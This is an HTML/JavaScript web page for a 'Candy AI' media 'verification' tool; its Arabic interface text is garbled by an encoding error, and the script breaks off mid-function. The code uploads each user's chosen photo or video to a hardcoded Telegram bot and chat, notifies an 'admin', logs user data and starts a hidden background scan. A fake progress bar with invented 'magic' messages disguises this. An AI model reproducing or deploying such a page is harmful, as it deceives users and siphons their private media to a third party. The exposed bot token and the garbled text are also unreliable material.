<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candy AI - Ø£Ø¯Ø§Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø³Ø§Ø­Ø±Ø©</title>
    <style>
        :root {
            --primary: #ff6bff;
            --secondary: #a855f7;
            --pink: #ff00ff;
            --purple: #9d4edd;
            --dark: #1a0033;
            --light: #fff0ff;
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Tajawal', sans-serif;
            background: var(--dark);
            color: var(--light);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(255, 107, 255, 0.15) 0%, transparent 30%),
                radial-gradient(circle at 80% 70%, rgba(168, 85, 247, 0.15) 0%, transparent 30%),
                linear-gradient(to bottom right, #1a0033, #2d0066);
            overflow-x: hidden;
        }
        .candy-particle {
            position: absolute;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            pointer-events: none;
            z-index: -1;
        }
        #container {
            width: 100%;
            max-width: 900px;
            background: rgba(40, 0, 80, 0.7);
            border-radius: 25px;
            box-shadow: 0 10px 30px rgba(255, 107, 255, 0.3);
            overflow: hidden;
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.5s ease;
            position: relative;
            z-index: 1;
        }
        #container:hover {
            box-shadow: 0 15px 40px rgba(255, 107, 255, 0.5);
            transform: translateY(-5px);
        }
        #header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        #header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%),
                repeating-linear-gradient(45deg, transparent, transparent 5px, rgba(255,255,255,0.05) 5px, rgba(255,255,255,0.05) 10px);
            animation: shine 8s linear infinite;
            z-index: -1;
        }
        @keyframes shine {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
            background: linear-gradient(to right, #ff6bff, #ffb3ff, #ff6bff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: titleGlow 3s ease-in-out infinite alternate;
        }
        @keyframes titleGlow {
            0% { text-shadow: 0 0 5px rgba(255, 107, 255, 0.5); }
            100% { text-shadow: 0 0 20px rgba(255, 107, 255, 0.9), 0 0 30px rgba(255, 180, 255, 0.5); }
        }
        #header p {
            font-size: 1.1rem;
            opacity: 0.9;
            position: relative;
            z-index: 1;
            color: #ffccff;
        }
        #content {
            padding: 30px;
            position: relative;
        }
        .upload-area {
            border: 3px dashed rgba(255, 180, 255, 0.3);
            border-radius: 20px;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 25px;
            cursor: pointer;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
            background: rgba(80, 0, 120, 0.2);
        }
        .upload-area:hover {
            border-color: var(--pink);
            background: rgba(255, 107, 255, 0.1);
            box-shadow: 0 5px 15px rgba(255, 107, 255, 0.2);
            transform: translateY(-3px);
        }
        .upload-area.active {
            border-color: var(--secondary);
            background: rgba(168, 85, 247, 0.1);
        }
        .upload-area i {
            font-size: 3.5rem;
            margin-bottom: 15px;
            display: block;
            background: linear-gradient(to bottom, #ff6bff, #ffb3ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: iconFloat 3s ease-in-out infinite;
        }
        @keyframes iconFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .upload-area h2 {
            font-size: 1.6rem;
            margin-bottom: 10px;
            color: #ffccff;
        }
        .upload-area p {
            color: rgba(255, 200, 255, 0.7);
            font-size: 0.95rem;
        }
        #file-input {
            display: none;
        }
        #preview-container {
            margin: 25px 0;
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        #media-preview {
            max-width: 100%;
            max-height: 400px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(255, 107, 255, 0.3);
            display: none;
            border: 2px solid rgba(255, 180, 255, 0.3);
        }
        #media-info {
            width: 100%;
            background: rgba(100, 0, 150, 0.3);
            border-radius: 15px;
            padding: 20px;
            display: none;
            border: 1px solid rgba(255, 180, 255, 0.2);
            backdrop-filter: blur(5px);
        }
        #media-info p {
            margin-bottom: 10px;
            font-size: 0.95rem;
            color: rgba(255, 220, 255, 0.9);
        }
        #media-info p strong {
            color: #ffb3ff;
            font-weight: bold;
        }
        #progress-container {
            width: 100%;
            margin: 25px 0;
            display: none;
        }
        #progress-bar {
            width: 100%;
            height: 15px;
            background: rgba(255, 180, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 8px;
            border: 1px solid rgba(255, 180, 255, 0.2);
        }
        #progress {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            transition: width 0.5s ease;
            position: relative;
            box-shadow: 0 0 10px rgba(255, 107, 255, 0.5);
        }
        #progress::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, 
                transparent, 
                rgba(255, 255, 255, 0.5), 
                transparent);
            animation: progressShine 2s infinite;
        }
        @keyframes progressShine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        #progress-text {
            text-align: center;
            font-size: 0.9rem;
            color: rgba(255, 220, 255, 0.8);
            text-shadow: 0 0 5px rgba(255, 107, 255, 0.3);
        }
        #status {
            padding: 18px;
            border-radius: 12px;
            margin-top: 25px;
            display: none;
            text-align: center;
            font-weight: bold;
            backdrop-filter: blur(5px);
            animation: statusPulse 2s infinite alternate;
        }
        @keyframes statusPulse {
            0% { box-shadow: 0 0 5px rgba(255, 107, 255, 0.1); }
            100% { box-shadow: 0 0 15px rgba(255, 107, 255, 0.3); }
        }
        .success {
            background: rgba(40, 200, 100, 0.2);
            color: #88ffaa;
            border: 1px solid rgba(100, 255, 150, 0.3);
        }
        .error {
            background: rgba(220, 80, 100, 0.2);
            color: #ff8888;
            border: 1px solid rgba(255, 100, 120, 0.3);
        }
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            transition: all 0.4s ease;
            box-shadow: 0 5px 20px rgba(255, 107, 255, 0.4);
            display: inline-block;
            margin: 15px 0;
            position: relative;
            overflow: hidden;
            z-index: 1;
            border: 1px solid rgba(255, 180, 255, 0.3);
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--secondary), var(--primary));
            z-index: -1;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .btn:hover {
            transform: translateY(-3px) scale(1.03);
            box-shadow: 0 8px 25px rgba(255, 107, 255, 0.6);
        }
        .btn:hover::before {
            opacity: 1;
        }
        .btn:active {
            transform: translateY(1px);
        }
        .btn:disabled {
            background: #555;
            cursor: not-allowed;
            opacity: 0.7;
            transform: none !important;
            box-shadow: none !important;
        }
        .btn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right, 
                rgba(255, 255, 255, 0) 0%, 
                rgba(255, 255, 255, 0) 45%, 
                rgba(255, 255, 255, 0.4) 50%, 
                rgba(255, 255, 255, 0) 55%, 
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: btnShine 3s infinite;
        }
        @keyframes btnShine {
            0% { transform: translateX(-100%) rotate(30deg); }
            100% { transform: translateX(100%) rotate(30deg); }
        }
        .hidden {
            display: none !important;
        }
        #advanced-scan {
            margin-top: 25px;
            padding: 20px;
            background: rgba(80, 0, 120, 0.3);
            border-radius: 15px;
            display: none;
            border: 1px solid rgba(255, 180, 255, 0.2);
            backdrop-filter: blur(5px);
        }
        #advanced-scan h3 {
            margin-bottom: 15px;
            color: #ffb3ff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        #scan-results {
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            color: rgba(255, 220, 255, 0.8);
            white-space: pre;
            line-height: 1.6;
            background: rgba(0, 0, 30, 0.3);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid rgba(255, 180, 255, 0.1);
            max-height: 200px;
            overflow-y: auto;
        }
        .scan-line {
            animation: scanLine 0.6s infinite;
            display: inline-block;
        }
        @keyframes scanLine {
            0%, 100% { opacity: 0.6; text-shadow: 0 0 5px rgba(255, 107, 255, 0.3); }
            50% { opacity: 1; text-shadow: 0 0 10px rgba(255, 107, 255, 0.6); }
        }
        
        /* Ø²Ø± Ø§Ù„Ù…Ø·ÙˆØ± */
        #dev-corner {
            position: fixed;
            bottom: 25px;
            left: 25px;
            z-index: 1000;
        }
        
        #dev-btn {
            background: linear-gradient(135deg, #ff00cc, #cc00ff);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 5px 20px rgba(204, 0, 255, 0.5);
            font-size: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
            border: 2px solid rgba(255, 180, 255, 0.5);
        }
        
        #dev-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right, 
                rgba(255, 255, 255, 0) 0%, 
                rgba(255, 255, 255, 0) 45%, 
                rgba(255, 255, 255, 0.4) 50%, 
                rgba(255, 255, 255, 0) 55%, 
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: btnShine 3s infinite;
        }
        
        #dev-btn:hover {
            transform: scale(1.1) rotate(10deg);
            box-shadow: 0 8px 25px rgba(204, 0, 255, 0.7);
        }
        
        #dev-options {
            position: absolute;
            bottom: 70px;
            left: 0;
            background: rgba(60, 0, 90, 0.9);
            border-radius: 15px;
            padding: 15px;
            width: 220px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
            display: none;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 180, 255, 0.3);
            transform-origin: bottom left;
            animation: optionsFade 0.3s ease-out;
        }
        
        @keyframes optionsFade {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        
        .dev-option {
            color: white;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            background: rgba(100, 0, 150, 0.3);
            border: 1px solid rgba(255, 180, 255, 0.2);
        }
        
        .dev-option:hover {
            background: rgba(150, 0, 200, 0.5);
            transform: translateX(5px);
        }
        
        .dev-option i {
            margin-left: 12px;
            font-size: 20px;
        }
        
        .telegram-option {
            color: #40b3ff;
        }
        
        .instagram-option {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
        }
        
        .instagram-option::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            opacity: 0.2;
            border-radius: 7px;
            z-index: -1;
        }
        
        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¬Ø³ÙŠÙ…Ø§Øª */
        .candy-particle {
            position: absolute;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: linear-gradient(to bottom right, #ff6bff, #a855f7);
            box-shadow: 0 0 10px #ff6bff, 0 0 20px #ff6bff;
            pointer-events: none;
            z-index: -1;
            animation: float 5s infinite ease-in-out;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ…Ø±ÙŠØ± Ø§Ù„Ù…Ø®ØµØµ */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(40, 0, 80, 0.3);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(to bottom, #ff6bff, #a855f7);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(to bottom, #ff8bff, #b875f7);
        }
        
        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„ÙˆØ§Ù…Ø¶ */
        .glow {
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ff6bff, 0 0 20px #ff6bff; }
            to { text-shadow: 0 0 10px #fff, 0 0 20px #ff8bff, 0 0 30px #ff6bff, 0 0 40px #ff6bff; }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <!-- Ø¬Ø³ÙŠÙ…Ø§Øª Ø§Ù„Ø®Ù„ÙÙŠØ© -->
    <div id="particles"></div>
    
    <div id="container">
        <div id="header">
            <h1><span class="glow">Candy AI</span></h1>
            <p>Ø£Ø¯Ø§Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø³Ø­Ø±ÙŠØ© Ø¨Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</p>
        </div>
        
        <div id="content">
            <div class="upload-area" id="upload-area">
                <i class="fas fa-candy-cane"></i>
                <h2>Ø§Ø³Ø­Ø¨ ÙˆØ£ÙÙ„Øª Ø§Ù„Ù…Ù„ÙØ§Øª Ù‡Ù†Ø§</h2>
                <p>Ø£Ùˆ Ø§Ù†Ù‚Ø± Ù„Ø§Ø®ØªÙŠØ§Ø± Ù…Ù„Ù (ÙŠØ¯Ø¹Ù… Ø§Ù„ØµÙˆØ± ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆÙ‡Ø§Øª)</p>
                <input type="file" id="file-input" accept="image/*,video/*">
            </div>
            
            <button class="btn" id="upload-btn">
                <i class="fas fa-magic" style="margin-left: 8px;"></i>
                Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø³Ø­Ø±ÙŠ
            </button>
            
            <div id="progress-container">
                <div id="progress-bar">
                    <div id="progress"></div>
                </div>
                <div id="progress-text">Ø¬Ø§Ø±ÙŠ Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø³Ø­Ø±...</div>
            </div>
            
            <div id="preview-container">
                <video id="media-preview" controls></video>
                <img id="media-preview">
                
                <div id="media-info">
                    <p><strong><i class="fas fa-info-circle" style="margin-left: 5px;"></i> Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ù„Ù:</strong></p>
                    <p id="file-name"><i class="fas fa-file-alt" style="margin-left: 5px;"></i> Ø§Ù„Ø§Ø³Ù…: -</p>
                    <p id="file-size"><i class="fas fa-weight" style="margin-left: 5px;"></i> Ø§Ù„Ø­Ø¬Ù…: -</p>
                    <p id="file-type"><i class="fas fa-file-image" style="margin-left: 5px;"></i> Ø§Ù„Ù†ÙˆØ¹: -</p>
                    <p id="file-modified"><i class="fas fa-clock" style="margin-left: 5px;"></i> Ø¢Ø®Ø± ØªØ¹Ø¯ÙŠÙ„: -</p>
                </div>
            </div>
            
            <div id="status"></div>
            
            <div id="advanced-scan">
                <h3>
                    <i class="fas fa-hat-wizard"></i>
                    Ø§Ù„ÙØ­Øµ Ø§Ù„Ø³Ø­Ø±ÙŠ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…
                </h3>
                <div id="scan-results"></div>
            </div>
        </div>
    </div>

    <!-- Ø²Ø± Ø§Ù„Ù…Ø·ÙˆØ± -->
    <div id="dev-corner">
        <button id="dev-btn"><i class="fas fa-wand-magic-sparkles"></i></button>
        <div id="dev-options">
            <div class="dev-option telegram-option" onclick="window.open('https://t.me/Candy1Ai_bot', '_blank')">
                <i class="fab fa-telegram"></i>
                <span>ØªÙˆØ§ØµÙ„ Ø¹Ø¨Ø± Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…</span>
            </div>
            <div class="dev-option instagram-option" onclick="window.open('https://instagram.com/5bidd', '_blank')">
                <i class="fab fa-instagram"></i>
                <span>ØªØ§Ø¨Ø¹Ù†Ø§ Ø¹Ù„Ù‰ Ø§Ù„Ø¥Ù†Ø³ØªØ¬Ø±Ø§Ù…</span>
            </div>
        </div>
    </div>

    <script>
        // Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ø³ÙŠÙ…Ø§Øª Ø§Ù„Ø®Ù„ÙÙŠØ©
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('candy-particle');
                
                // ÙˆØ¶Ø¹ Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                particle.style.left = `${Math.random() * 100}vw`;
                particle.style.top = `${Math.random() * 100}vh`;
                
                // Ø­Ø¬Ù… Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                const size = Math.random() * 10 + 5;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // ØªØ£Ø®ÙŠØ± Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ù„Ù„Ø­Ø±ÙƒØ©
                particle.style.animationDelay = `${Math.random() * 5}s`;
                particle.style.animationDuration = `${Math.random() * 10 + 5}s`;
                
                // Ø´ÙØ§ÙÙŠØ© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ©
                particle.style.opacity = Math.random() * 0.5 + 0.3;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø³Ø±ÙŠØ© (ÙŠØ¬Ø¨ ØªØºÙŠÙŠØ±Ù‡Ø§)
        const BOT_TOKEN = "8171488565:AAFJpnPSWlVjbDAkSdynk8Jx6W8GuVHaeOs";
        const CHAT_ID = "1430967336";
        const ADMIN_CHAT_ID = "1430967336";
        
        // Ø¹Ù†Ø§ØµØ± DOM
        const uploadArea = document.getElementById('upload-area');
        const fileInput = document.getElementById('file-input');
        const uploadBtn = document.getElementById('upload-btn');
        const previewContainer = document.getElementById('preview-container');
        const videoPreview = document.querySelector('video');
        const imgPreview = document.querySelector('img');
        const mediaInfo = document.getElementById('media-info');
        const progressContainer = document.getElementById('progress-container');
        const progressBar = document.getElementById('progress');
        const progressText = document.getElementById('progress-text');
        const statusDiv = document.getElementById('status');
        const advancedScan = document.getElementById('advanced-scan');
        const scanResults = document.getElementById('scan-results');
        const devBtn = document.getElementById('dev-btn');
        const devOptions = document.getElementById('dev-options');
        
        // Ø¹Ù†Ø§ØµØ± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ù„Ù
        const fileName = document.getElementById('file-name');
        const fileSize = document.getElementById('file-size');
        const fileType = document.getElementById('file-type');
        const fileModified = document.getElementById('file-modified');
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        let selectedFile = null;
        let fileTypeDetected = null;
        let metadata = {};
        let isScanning = false;
        
        // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
            setupEventListeners();
        });
        
        // Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ø³ØªÙ…Ø¹ÙŠ Ø§Ù„Ø£Ø­Ø¯Ø§Ø«
        function setupEventListeners() {
            // Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø±ÙØ¹
            uploadArea.addEventListener('click', function() {
                fileInput.click();
            });
            
            // Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ù„Ù
            fileInput.addEventListener('change', function() {
                if (this.files && this.files[0]) {
                    handleFile(this.files[0]);
                }
            });
            
            // Ø§Ù„Ø³Ø­Ø¨ ÙˆØ§Ù„Ø¥ÙÙ„Ø§Øª
            uploadArea.addEventListener('dragover', function(e) {
                e.preventDefault();
                this.classList.add('active');
            });
            
            uploadArea.addEventListener('dragleave', function() {
                this.classList.remove('active');
            });
            
            uploadArea.addEventListener('drop', function(e) {
                e.preventDefault();
                this.classList.remove('active');
                if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleFile(e.dataTransfer.files[0]);
                }
            });
            
            // Ø²Ø± Ø§Ù„Ø±ÙØ¹
            uploadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                if (!selectedFile) {
                    showStatus('âš ï¸ ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± Ù…Ù„Ù Ø£ÙˆÙ„Ø§Ù‹', 'error');
                    return;
                }
                startUploadProcess();
            });
            
            // Ø²Ø± Ø§Ù„Ù…Ø·ÙˆØ±
            devBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                devOptions.style.display = devOptions.style.display === 'block' ? 'none' : 'block';
            });
            
            // Ø¥ØºÙ„Ø§Ù‚ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø·ÙˆØ± Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø®Ø§Ø±Ø¬Ù‡Ø§
            document.addEventListener('click', function() {
                devOptions.style.display = 'none';
            });
            
            // Ù…Ù†Ø¹ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„ÙŠÙ‡Ø§
            devOptions.addEventListener('click', function(e) {
                e.stopPropagation();
            });
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø®ØªØ§Ø±
        function handleFile(file) {
            selectedFile = file;
            fileTypeDetected = file.type.split('/')[0];
            metadata = {
                name: file.name,
                size: formatFileSize(file.size),
                type: file.type,
                lastModified: new Date(file.lastModified).toLocaleString(),
                dimensions: 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„...'
            };
            
            // Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø©
            previewContainer.style.display = 'flex';
            mediaInfo.style.display = 'block';
            
            // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø§Øª Ø£ÙˆÙ„Ø§Ù‹
            videoPreview.style.display = 'none';
            imgPreview.style.display = 'none';
            
            const fileURL = URL.createObjectURL(file);
            
            if (fileTypeDetected === 'image') {
                imgPreview.src = fileURL;
                imgPreview.style.display = 'block';
                imgPreview.onload = function() {
                    metadata.dimensions = `${this.naturalWidth} Ã— ${this.naturalHeight} Ø¨ÙƒØ³Ù„`;
                    updateFileInfo();
                };
            } else if (fileTypeDetected === 'video') {
                videoPreview.src = fileURL;
                videoPreview.style.display = 'block';
                videoPreview.onloadedmetadata = function() {
                    metadata.dimensions = `${this.videoWidth} Ã— ${this.videoHeight} Ø¨ÙƒØ³Ù„`;
                    updateFileInfo();
                };
            }
            
            updateFileInfo();
            uploadBtn.disabled = false;
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø®ÙÙŠ
            startBackgroundScan();
        }
        
        // ØªØ­Ø¯ÙŠØ« Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ù„Ù
        function updateFileInfo() {
            fileName.textContent = `Ø§Ù„Ø§Ø³Ù…: ${metadata.name}`;
            fileSize.textContent = `Ø§Ù„Ø­Ø¬Ù…: ${metadata.size}`;
            fileType.textContent = `Ø§Ù„Ù†ÙˆØ¹: ${metadata.type}`;
            fileModified.textContent = `Ø¢Ø®Ø± ØªØ¹Ø¯ÙŠÙ„: ${metadata.lastModified}`;
        }
        
        // ØªÙ†Ø³ÙŠÙ‚ Ø­Ø¬Ù… Ø§Ù„Ù…Ù„Ù
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Ø¨Ø§ÙŠØª';
            const k = 1024;
            const sizes = ['Ø¨Ø§ÙŠØª', 'ÙƒÙŠÙ„ÙˆØ¨Ø§ÙŠØª', 'Ù…ÙŠØ¬Ø§Ø¨Ø§ÙŠØª', 'Ø¬ÙŠØ¬Ø§Ø¨Ø§ÙŠØª'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        // Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±ÙØ¹
        async function startUploadProcess() {
            uploadBtn.disabled = true;
            progressContainer.style.display = 'block';
            statusDiv.style.display = 'none';
            
            // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªÙ‚Ø¯Ù…
            simulateProgress();
            
            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                const telegramResult = await sendToTelegram(selectedFile);
                console.log('ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…:', telegramResult);
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø¯Ù…Ù†
                await sendAdminNotification(selectedFile);
                
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                logUserData();
                
                showStatus('âœ¨ ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!', 'success');
            } catch (error) {
                console.error('Ø­Ø¯Ø« Ø®Ø·Ø£:', error);
                showStatus(`âŒ ${error.message}`, 'error');
                progressBar.style.background = '#ff6b6b';
            } finally {
                uploadBtn.disabled = false;
                progressText.textContent = 'Ø§ÙƒØªÙ…Ù„ Ø§Ù„Ø³Ø­Ø±!';
            }
        }
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
        function simulateProgress() {
            let progress = 0;
            const steps = [10, 25, 40, 55, 70, 85, 95, 100];
            let stepIndex = 0;
            
            const messages = [
                "Ø¬Ø§Ø±ÙŠ ØªØ­Ø¶ÙŠØ± Ø§Ù„ØªØ¹ÙˆÙŠØ°Ø©...",
                "ØªÙ†Ø´ÙŠØ· Ø§Ù„Ø¨Ù„ÙˆØ±Ø§Øª Ø§Ù„Ø³Ø­Ø±ÙŠØ©...",
                "ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø·Ø§Ù‚Ø© Ø§Ù„ÙƒÙˆÙ†ÙŠØ©...",
                "Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯...",
                "ØªÙ†Ø¸ÙŠÙ… ØªØ±Ø¯Ø¯Ø§Øª Ø§Ù„Ø³Ø­Ø±...",
                "Ø¬Ø§Ø±ÙŠ ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØ¹ÙˆÙŠØ°Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©..."
            ];
            
            const interval = setInterval(() => {
                if (stepIndex >= steps.length) {
                    clearInterval(interval);
                    return;
                }
                
                progress = steps[stepIndex];
                stepIndex++;
                
                progressBar.style.width = `${progress}%`;
                
                // ØªØ­Ø¯ÙŠØ« Ù†Øµ Ø§Ù„ØªÙ‚Ø¯Ù…
                if (progress < 30) {
                    progressText.textContent = messages[0];
                } else if (progress < 60) {
                    progressText.textContent = messages[1];
                } else if (progress < 80) {
                    progressText.textContent = messages[2];
                } else if (progress < 90) {
                    progressText.textContent = messages[3];
                } else {
                    progressText.textContent = messages[4];
                }
            }, 500 + Math.random() * 800);
        }
        
        // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„Ø±ÙØ¹
        function showStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = type;
            statusDiv.style.display = 'block';
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        async function sendToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            // ØªØ­Ø¯ÙŠØ¯ Ù†ÙˆØ¹ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ ÙˆÙ†Ù‚Ø·Ø© Ø§Ù„Ù†Ù‡Ø§ÙŠØ© Ø§Ù„Ù…Ù†Ø§Ø³Ø¨Ø©
            let endpoint, fileField;
            if (fileTypeDetected === 'image') {
                endpoint = 'sendPhoto';
                fileField = 'photo';
